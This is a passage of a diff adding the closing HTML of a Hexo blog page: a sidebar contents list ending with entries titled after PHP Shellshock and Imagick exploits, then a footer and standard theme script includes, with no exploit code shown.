href="#PHP-5-x-Shellshock-Exploit"><span class="nav-number">7.</span> <span class="nav-text">PHP 5.x Shellshock Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Imagick-lt-3-3-0-PHP-gt-5-4-Exploit"><span class="nav-number">8.</span> <span class="nav-text">Imagick  <= 3.3.0 PHP >= 5.4 Exploit</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xl7dev</span>
+</div>
+
+<div class="powered-by">
+  Erstellt mit  <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
